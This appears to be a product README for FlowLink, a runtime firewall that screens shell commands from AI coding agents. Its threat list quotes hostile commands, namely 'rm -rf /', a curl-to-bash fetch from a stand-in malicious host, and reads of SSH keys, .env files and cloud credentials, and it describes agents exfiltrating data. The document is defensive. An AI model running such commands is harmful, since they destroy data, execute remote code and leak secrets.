# Runtime AI Firewall

**Intercepts AI agent commands at runtime. Blocks shell injection, credential theft, data exfiltration.**

*Claude Code · Cursor · Copilot · Windsurf · Any MCP client*

---

## What It Protects Against

AI coding agents execute shell commands on your servers. Without protection, they can:

### Shell Injection

Agent executes `rm -rf /` or `curl malicious.com/payload | bash` — your server is compromised.

### Credential Theft

Agent reads `~/.ssh/id_rsa`, `.env`, AWS credentials, database passwords — secrets leaked.

### Data Exfiltration

Agent sends proprietary code, customer data, or trade secrets to external endpoints — IP stolen.

**FlowLink sits between your AI agents and the server. Every command is analyzed and approved (or blocked) before execution.**

---

## How It Works

```
  AI Agent               FlowLink               Server
┌──────────┐          ┌──────────────┐         ┌──────────┐
│          │          │              │         │          │
│  Claude  │──MCP──▶ │  7-Level     │─allow─▶│  Bash    │
│  Cursor  │  /WS    │  Analysis    │         │  Server  │
│  Copilot │          │              │─block──│          │
│  Custom  │          │  < 1ms       │         │          │
└──────────┘          └──────────────┘         └──────────┘
                             │
                      ┌──────┴──────┐
                      │  Dashboard  │
                      │  Audit Log  │
                      │  Policies   │
                      └─────────────┘
```

1. **Connect** — AI agent connects via MCP or WebSocket
2. **Intercept** — Every command/tool call passes through FlowLink
3. **Analyze** — 7-level threat analysis in < 1ms
4. **Decide** — Allow, warn, block, or send for human approval
5. **Log** — Every action recorded in audit trail

---

## Quick Start — 2 Minutes

```bash
# 1. Download binary
curl -fsSL https://flowlink.flow-masters.ru/downloads/flowlink-linux-amd64 \
  -o /usr/local/bin/flowlink && chmod +x /usr/local/bin/flowlink

# 2. Register and get API key
# Visit https://flowlink.flow-masters.ru/login — free, no card required

# 3. Run agent
flowlink agent --api-key YOUR_KEY --relay wss://flowlink.flow-masters.ru/ws

# 4. That's it. Every command is now protected.
```

[Try it in your browser →](https://flowlink.flow-masters.ru/playground)

---

## Why FlowLink

| Feature | FlowLink | Prompt Scanners | LLM Proxies | Manual RBAC |
|---------|----------|----------------|-------------|-------------|
| Runtime interception | Kernel-level | Text-only | Text-only | Manual |
| Shell injection | Blocked at exec | Heuristic | Not checked | Manual |
| Credential theft | Blocked | Not checked | Not checked | Manual |
| Data exfiltration | Blocked | Not checked | Not checked | Not checked |
| MCP support | Native proxy | Not checked | Not checked | Manual |
| < 1ms latency | Yes | Yes | No (100ms+) | Yes |

> **3 attack vectors, 1 gateway, zero code changes.**

---

## Links

- **Website:** [flowlink.flow-masters.ru](https://flowlink.flow-masters.ru)
- **Documentation:** [Getting Started](getting-started.md)
- **Playground:** [Try now](https://flowlink.flow-masters.ru/playground)
- **Pricing:** [See plans](https://flowlink.flow-masters.ru/pricing)
- **Security:** [Report vulnerability](security.md)
- **GitHub:** [braincreator/flowlink-ai-firewall](https://github.com/braincreator/flowlink-ai-firewall)
